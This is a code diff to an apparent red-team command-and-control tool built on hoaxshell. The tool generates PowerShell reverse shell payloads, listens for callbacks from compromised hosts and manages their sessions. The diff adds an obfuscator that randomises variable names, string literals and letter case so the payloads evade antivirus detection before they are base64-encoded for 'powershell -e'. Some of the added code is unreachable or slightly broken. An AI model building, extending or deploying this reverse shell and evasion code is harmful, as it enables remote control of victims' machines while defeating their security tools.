@@ -17,30 +17,17 @@ from string import ascii_uppercase, ascii_lowercase
 from pyperclip import copy as copy2cb
 from uuid import uuid4
 from ast import literal_eval
+from random import randint, choice
 from .common import *
-from .settings import Threading_params, Core_server_settings, Sessions_manager_settings
+from .settings import Threading_params, Core_server_settings, Sessions_manager_settings, Hoaxshell_settings
 
 filterwarnings("ignore", category = DeprecationWarning)
 
-
-# Parameter parsing
-cwd = os.path.dirname(os.path.abspath(__file__))
-bind_address = '0.0.0.0'
-bind_port = 65002
-_header = 'Authorization'
-default_frequency = 0.8
-certfile, keyfile = False, False
-
-
 # Check if both cert and key files were provided
-if (certfile and not keyfile) or (keyfile and not certfile):
-	exit_with_msg('Failed to start over https. Missing key or cert file (check -h for more details).')
+if (Hoaxshell_settings.certfile and not Hoaxshell_settings.keyfile) or (Hoaxshell_settings.keyfile and not Hoaxshell_settings.certfile):
+	exit_with_msg('SSL support seems to be misconfigured (missing key or cert file). Review settings.py file.')
 
-ssl_support = True if certfile and keyfile else False
-
-# -------------- General Functions -------------- #
-
-
+ssl_support = True if Hoaxshell_settings.certfile and Hoaxshell_settings.keyfile else False
 
 # ------------------ Settings ------------------ #
 # ~ prompt = "hoaxshell > "
@@ -57,6 +44,10 @@ ssl_support = True if certfile and keyfile else False
 
 
 class Payload_generator:
+
+	def __init__(self):
+		self.obfuscator = Obfuscator()
+
 
 	def encodePayload(self, payload):
 		enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
@@ -90,11 +81,10 @@ class Payload_generator:
 		if not args_dict:
 			print('Error parsing arguments. Check your input and try again.')
 			return 1
-		
-		global bind_port, _header, default_frequency
-		
+				
 		boolean_args = {
 			'raw' : False,
+			'obfuscate' : False,
 			'constraint_mode' : False,
 			'invoke_restmethod' : False,
 			'trusted_domain' : False
@@ -146,7 +136,7 @@ class Payload_generator:
 				return 1				
 				
 		else:	
-			frequency = default_frequency
+			frequency = Hoaxshell_settings.default_frequency
 		
 		
 		
@@ -161,7 +151,7 @@ class Payload_generator:
 					print(f'HEADER value includes illegal character "{char}".')
 					return 1
 			
-			_header = args_dict['header']
+			Hoaxshell_settings._header = args_dict['header']
 
 
 
@@ -200,25 +190,25 @@ class Payload_generator:
 
 
 		''' Parse RAW '''	
-		if 'raw' in arguments:
-			raw_payload = True if args_dict['raw'].lower() == 'true' else False
+		if 'encode' in arguments:
+			encode = True if args_dict['encode'].lower() == 'true' else False
 		else:
-			raw_payload = False
+			encode = False
 			
 		if (os_type == 'linux'):
 			boolean_args['constraint_mode'] = True
 			boolean_args['trusted_domain'] = True
 			exec_outfile = False
-			raw_payload = True
+			encode = False
 
-		lhost = f'{lhost}:{bind_port}'
+		lhost = f'{lhost}:{Hoaxshell_settings.bind_port}'
 
 		# Create session unique id
 		verify = str(uuid4())[0:8]
 		get_cmd = str(uuid4())[0:8]
 		post_res = str(uuid4())[0:8]
 		hid = str(uuid4()).split("-")
-		header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not _header else _header
+		header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not Hoaxshell_settings._header else Hoaxshell_settings._header
 		session_unique_id = '-'.join([verify, get_cmd, post_res])
 
 		print(f'Generating reverse shell payload...')
@@ -253,8 +243,8 @@ class Payload_generator:
 			'frequency' : frequency
 		}
 		
-		if not raw_payload:
-			payload = self.encodePayload(payload)
+		payload = self.obfuscator.mask_payload(payload) if boolean_args['obfuscate'] else payload
+		payload = self.encodePayload(payload) if encode else payload
 		
 		print(f'{PLOAD}{payload}{END}')
 		copy2cb(payload)
@@ -264,9 +254,173 @@ class Payload_generator:
 
 
 
-	def obfuscate(self, payload):
+class Obfuscator:
+
+	def mask_char(self, char):
 		
-		pass
+		path = randint(1,3)
+			
+		if char.isalpha():
+			
+			if path == 1: 
+				return char
+			
+			return '\w' if path == 2 else f'({char}|\\?)'
+		
+		
+		
+		elif char.isnumeric():
+
+			if path == 1: 
+				return char
+			
+			return '\d' if path == 2 else f'({char}|\\?)'
+		
+		
+		
+		elif char in '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~':
+			
+			if char in ['$^*\\+?']:
+				char = '\\' + char
+				
+			if path == 1: 
+				return char
+			
+			return '\W' if path == 2 else f'({char}|\\?)'
+		
+		else:
+			return None
+
+
+
+	def randomize_case(self, string):
+		return ''.join(choice((str.upper, str.lower))(c) for c in string)
+
+
+	
+	def string_to_regex(self, string):
+		
+		regex = ''
+		str_length = len(string)
+		chars_used = 0
+		c = 0
+		
+		while True:
+
+			chars_left = (str_length - chars_used)			
+			
+			if chars_left:
+				
+				pair_length = randint(1, chars_left)
+				regex += '['
+				
+				for i in range(c, pair_length + c):
+
+					masked = self.mask_char(string[i])
+					regex += masked
+					c += 1
+					
+				chars_used += pair_length
+				
+				regex += ']{' + str(pair_length) + '}'
+
+			else:
+				break
+		
+		return regex
+
+
+
+	def concatenate_string(self, string):
+		
+		str_length = len(string)
+		
+		if str_length <= 1:
+			return string
+			
+		concat = ''
+		str_length = len(string)
+		chars_used = 0
+		c = 0
+		
+		while True:
+
+			chars_left = (str_length - chars_used)			
+			
+			if chars_left:
+				
+				pair_length = randint(1, chars_left)
+				concat += "'"
+				
+				for i in range(c, pair_length + c):
+
+					concat += string[i]
+					c += 1
+					
+				chars_used += pair_length				
+				concat = (concat + "'+") if (chars_used < str_length) else (concat + "'")
+
+			else:
+				break	
+	
+		return concat
+		
+
+	def mask_payload(self, payload):
+		
+		# Obfuscate variable names
+		variables = re.findall("\$[A-Za-z0-9_]*", payload)
+		
+		if variables:
+			for var in variables:
+				
+				_max = randint(1,6)
+				obf = str(uuid4())[0:_max]				
+				payload = payload.replace(var, f'${obf}')
+
+		
+		
+		# Obfuscate strings
+		strings = re.findall(r"'(.+?)'", payload)
+		
+		if strings:
+			for string in strings:
+
+				string_length = len(string)
+				method = randint(0, 1)
+					
+				if method == 0: # String to regex
+					
+					_max = randint(3,8)
+					random_string = str(uuid4())[0:_max]				
+					regex = self.string_to_regex(random_string)
+					replace_obf = self.randomize_case('-replace')
+					payload = payload.replace(f"'{string}'", f"$('{random_string}' {replace_obf} '{regex}','{string}')")
+				
+				elif method == 1: # Concatenate string
+					
+					submethod = randint(0, 1)
+					string = string.strip("'")
+					concat = self.concatenate_string(string)
+					
+					if submethod == 0: # return raw
+						payload = payload.replace(f"'{string}'", concat)
+						
+					elif submethod == 1: # retrun execute instance
+						payload = payload.replace(f"'{string}'", f"$({concat})")
+					
+		return payload
+				
+
+		
+		# Randomize the case of each char in parameter names
+		ps_parameters = re.findall("\s-[A-Za-z]*", payload)
+		
+		if ps_parameters:		
+			for param in ps_parameters:			
+				param = param.strip()
+				rand_param_case = self.randomize_case(param)
+				payload = payload.replace(param, rand_param_case)
 
 
 
@@ -336,7 +490,7 @@ class Sessions_manager:
 		
 		if session_id in self.active_sessions.keys():
 			Hoaxshell.dropSession(session_id)
-			sleep(default_frequency)
+			sleep(Hoaxshell_settings.default_frequency)
 			self.active_sessions.pop(session_id, None)
 			self.legit_session_ids.pop(session_id, None)
 			session_id_components = session_id.split('-')
@@ -353,8 +507,7 @@ class Sessions_manager:
 # -------------- Hoaxshell Server -------------- #
 class Hoaxshell(BaseHTTPRequestHandler):
 	
-	global _header, default_frequency
-	header_id = _header
+	header_id = Hoaxshell_settings._header
 	server_unique_id = None
 	rst_promt_required = False
 	prompt_ready = True
@@ -672,7 +825,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				Hoaxshell.dropSession(session_id)				
 				Core_server.announce_session_termination({'session_id' : session_id})
 			
-			sleep(default_frequency + 2.0)
+			sleep(Hoaxshell_settings.default_frequency + 2.0)
 			print(f'\r[{INFO}] Sessions terminated.')
 			
 		else:
@@ -688,7 +841,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		while session_id in Sessions_manager.active_sessions.keys():
 
 			timestamp = int(datetime.now().timestamp())
-			tlimit = (default_frequency + Sessions_manager_settings.shell_state_change_after)
+			tlimit = (Hoaxshell_settings.default_frequency + Sessions_manager_settings.shell_state_change_after)
 
 			if (abs(Sessions_manager.active_sessions[session_id]['last_received'] - timestamp) > tlimit):
 				Sessions_manager.active_sessions[session_id]['Status'] = 'Undefined'
@@ -706,15 +859,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 def initiate_hoax_server():
 
 	try:
-		
-		global bind_port, bind_address
-			
+					
 		# Start http server
 		try:
-			httpd = HTTPServer((bind_address, bind_port), Hoaxshell)
+			httpd = HTTPServer((Hoaxshell_settings.bind_address, Hoaxshell_settings.bind_port), Hoaxshell)
 
 		except OSError:
-			exit(f'\n[{FAILED}] {BOLD}Port {bind_port} seems to already be in use.{END}\n')
+			exit(f'\n[{FAILED}] {BOLD}Port {Hoaxshell_settings.bind_port} seems to already be in use.{END}\n')
 		
 		except:
 			exit(f'\n[{FAILED}] HTTP server failed to start (Unknown error occurred).\n')
@@ -732,7 +883,7 @@ def initiate_hoax_server():
 		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
 		Hoaxshell_server.daemon = True
 		Hoaxshell_server.start()
-		print(f'[{INFO}] Hoaxshell engine listening on {ORANGE}{bind_address}{END}:{ORANGE}{bind_port}{END}\n')
+		print(f'[{INFO}] Hoaxshell engine listening on {ORANGE}{Hoaxshell_settings.bind_address}{END}:{ORANGE}{Hoaxshell_settings.bind_port}{END}\n')
 
 		
 		# Generate payload
@@ -790,7 +941,6 @@ def initiate_hoax_server():
 
 
 
-
 class Core_server:
 	
 	acknowledged_servers = []
@@ -798,18 +948,12 @@ class Core_server:
 	CLIENT_BUFFER_SIZE = 4096
 	SERVER_UNIQUE_ID = str(uuid4()).replace('-', '')
 	HOSTNAME = socket.gethostname()
-	bind_port = 65001
-	bind_address = '0.0.0.0'
 	listen = True
 	ping_sibling_servers = False
 	CONNECT_SYN = b'\x4f\x86\x2f\x7b'
 	CONNECT_ACK = b'\x5b\x2e\x42\x6d'
 	CONNECT_DENY = b'\x3c\xc3\x86\xde'
 		
-	# Threading
-	# ~ max_threads = 100
-	# ~ thread_limiter = BoundedSemaphore(max_threads)
-	
 			
 	@staticmethod	
 	def return_server_uniq_id():
@@ -993,12 +1137,12 @@ class Core_server:
 		
 		try:
 			server_socket = socket.socket()
-			server_socket.bind((self.bind_address, self.bind_port))
+			server_socket.bind((Core_server_settings.bind_address, Core_server_settings.bind_port))
 					
 		except OSError:
 			exit_with_msg('Core server failed to establish socket.')
 			
-		print(f'\r[{INFO}] Core server listening on {ORANGE}{self.bind_address}{END}:{ORANGE}{self.bind_port}{END}')
+		print(f'\r[{INFO}] Core server listening on {ORANGE}{Core_server_settings.bind_address}{END}:{ORANGE}{Core_server_settings.bind_port}{END}')
 
 		# Start listening for connections
 		server_socket.listen()
@@ -1247,7 +1391,7 @@ class Core_server:
 			authorized = False					
 		
 		# Check if attempt to connect to self
-		if (server_port == self.bind_port) and (server_ip in ['127.0.0.1', 'localhost']):
+		if (server_port == Core_server_settings.bind_port) and (server_ip in ['127.0.0.1', 'localhost']):
 			print('\rIf you really want to connect with yourself, try yoga.')
 			authorized = False						
 		
@@ -1271,7 +1415,7 @@ class Core_server:
 				return print(f'\r[{FAILED}] Connection timed out.')
 
 			elif response == self.CONNECT_ACK:
-				response = self.send_receive_one(f'{self.SERVER_UNIQUE_ID}:{self.bind_port}:{self.HOSTNAME}', server_ip, server_port, encode_msg = True)
+				response = self.send_receive_one(f'{self.SERVER_UNIQUE_ID}:{Core_server_settings.bind_port}:{self.HOSTNAME}', server_ip, server_port, encode_msg = True)
 				tmp = response.decode('utf-8').split(':')
 				sibling_id = tmp[0]
 				sibling_hostname = tmp[1]
